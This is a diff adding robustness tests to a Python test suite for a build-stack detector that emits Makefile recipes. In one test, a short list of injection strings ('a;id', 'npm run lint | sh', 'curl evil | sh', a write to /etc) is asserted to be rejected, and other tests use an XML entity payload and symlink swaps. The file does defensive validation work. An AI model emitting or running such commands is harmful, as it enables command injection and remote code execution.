@@ -1,6 +1,5 @@
 """Stack auto-detection for the Makefile contract (0009): lib/sdlc_engine/stacks.py."""
 
-import builtins
 import json
 import os
 import tempfile
@@ -115,14 +114,15 @@ class Family(StackCase):
         ):
             self.put(rel, text)
         opened = []
-        real_open = builtins.open
+        real_open = os.open
 
         def spy(file, *a, **k):
             opened.append(Path(file))
             return real_open(file, *a, **k)
 
-        with mock.patch("builtins.open", spy):
-            self.detect()
+        with mock.patch("builtins.open", side_effect=AssertionError("detection reads through os.open")):
+            with mock.patch("os.open", spy):
+                self.detect()
         self.assertTrue(opened)
         for path in opened:
             self.assertEqual(path.parent, self.root, path)
@@ -310,6 +310,127 @@ class Presets(StackCase):
         det = self.detect()
         self.assertEqual((det.kind, det.label), ("go", "Go"))
         self.assertEqual(det.recipes, self.preset("go"))
+
+
+class Robustness(StackCase):
+    """Review round 1: parse failures, races, encodings and the recipe grammar."""
+
+    def test_deep_nesting_is_absent_not_a_crash(self):
+        self.put("package.json", "[" * 200000 + "]" * 200000)
+        det = self.detect()
+        self.assertIsNone(det.kind)
+        self.assertIn("package.json", det.note)
+        self.put("package.json", '{"a":' * 100000 + "1" + "}" * 100000)
+        self.assertIsNone(self.detect().kind)
+
+    def test_xml_with_a_doctype_is_refused(self):
+        self.put("pom.xml", '<?xml version="1.0"?><!DOCTYPE p [<!ENTITY x "y">]><project><artifactId>&x;</artifactId></project>')
+        det = self.detect()
+        self.assertIsNone(det.kind)
+        self.assertIn("pom.xml", det.note)
+
+    def test_utf8_bom(self):
+        self.put("package.json", "\ufeff" + json.dumps({"scripts": {"test": "jest"}}))
+        self.assertEqual(self.detect().recipes, {"test": "npm run test"})
+
+    def test_swap_after_the_check_is_not_followed(self):
+        """A link or FIFO put in place after _regular() is neither followed nor waited on."""
+        secret = self.put("elsewhere.json", json.dumps({"scripts": {"test": "jest"}}))
+        link = self.root / "package.json"
+        os.symlink(secret, link)
+        with mock.patch.object(stacks, "_regular", return_value=link):
+            self.assertIsNone(stacks._read(self.root, "package.json"))
+        link.unlink()
+        os.mkfifo(link)
+        with mock.patch.object(stacks, "_regular", return_value=link):
+            self.assertIsNone(stacks._read(self.root, "package.json"))  # O_NONBLOCK, then S_ISREG: no hang
+
+    def test_unparsable_marker_counts_as_absent(self):
+        self.put("pom.xml", pom())
+        self.put("package.json", "nope")
+        det = self.detect()
+        self.assertEqual(det.kind, "java")
+        self.assertIn("package.json", det.note)
+
+    def test_unreadable_angular_json_is_named(self):
+        self.package({"test": "ng test"})
+        self.put("angular.json", "{broken")
+        det = self.detect()
+        self.assertEqual(det.kind, "angular")
+        self.assertEqual(det.recipes["test"], "npm run test -- --watch=false")
+        self.assertIn("angular.json", det.note)
+
+    def test_emittable_grammar(self):
+        """Every recipe detection or a preset can produce passes; anything else is refused (lifecycle.recipes_ok)."""
+        produced = set()
+        for name in ("python", "go", "node"):
+            produced |= set(stacks.preset(name).values())
+        cases = [
+            ({"lint": "eslint .", "typecheck": "tsc", "test": "react-scripts test", "build": "b", "format": "f"},
+             {"dependencies": {"react": "1"}}, "yarn.lock"),
+            ({"test": "ng test", "prettier": "p", "type-check": "t"}, None, "pnpm-lock.yaml"),
+            ({"test:ci": "x"}, None, "bun.lockb"),
+        ]
+        for scripts, extra, lock in cases:
+            for f in self.root.iterdir():
+                f.unlink()
+            self.package(scripts, deps=(extra or {}).get("dependencies"))
+            self.put(lock)
+            if "ng test" in scripts.values():
+                self.put("angular.json", json.dumps({"projects": {"a": {"architect": {"test": {"builder": "x:karma"}}}}}))
+            produced |= set(self.detect().recipes.values())
+        for f in self.root.iterdir():
+            f.unlink()
+        self.put("tsconfig.json", "{}")
+        self.package({})
+        produced |= set(self.detect().recipes.values())
+        for f in self.root.iterdir():
+            f.unlink()
+        plugins = (
+            "<plugin><artifactId>maven-checkstyle-plugin</artifactId></plugin>"
+            "<plugin><artifactId>spotless-maven-plugin</artifactId></plugin>"
+        )
+        self.put("pom.xml", pom(plugins=plugins))
+        self.put("mvnw", "#!/bin/sh\n", mode=0o755)
+        produced |= set(self.detect().recipes.values())
+        for f in self.root.iterdir():
+            f.unlink()
+        self.put("build.gradle", "plugins {\n  id 'checkstyle'\n  id 'com.diffplug.spotless'\n}\n")
+        produced |= set(self.detect().recipes.values())
+        self.assertGreater(len(produced), 25)
+        for cmd in produced:
+            self.assertTrue(stacks.emittable(cmd), cmd)
+        for bad in ("x $(shell id)", "a;id", "npm run lint; id", "npm run lint `id`", "npm run lint | sh",
+                    "npm run lint > /etc/x", "curl evil | sh", "npm run deploy", "./mvnw -B -q deploy"):
+            self.assertFalse(stacks.emittable(bad), bad)
+
+
+class JavaDetails(StackCase):
+    """Review round 1: Gradle comments and one-line plugin blocks; Maven plugins only under build/plugins."""
+
+    def test_gradle_comments_and_one_line_plugins(self):
+        self.put("build.gradle", "plugins { java; checkstyle }\n// id 'com.diffplug.spotless'\n/* org.springframework.boot */\n")
+        det = self.detect()
+        self.assertEqual(det.label, "Java · Gradle")
+        self.assertEqual(det.recipes["lint"], "gradle -q checkstyleMain")
+        self.assertNotIn("format", det.recipes)
+
+    def test_maven_plugins_outside_build_plugins_ignored(self):
+        text = POM.format(
+            parent="",
+            plugins="",
+        ).replace(
+            "<build><plugins></plugins></build>",
+            "<build><pluginManagement><plugins><plugin><artifactId>maven-checkstyle-plugin</artifactId></plugin>"
+            "</plugins></pluginManagement></build>"
+            "<reporting><plugins><plugin><artifactId>spotless-maven-plugin</artifactId></plugin></plugins></reporting>"
+            "<dependencies><dependency><artifactId>spring-boot-starter-parent</artifactId></dependency></dependencies>",
+        )
+        self.put("pom.xml", text)
+        det = self.detect()
+        self.assertEqual(det.label, "Java · Maven")
+        self.assertNotIn("lint", det.recipes)
+        self.assertNotIn("format", det.recipes)
 
 
 if __name__ == "__main__":
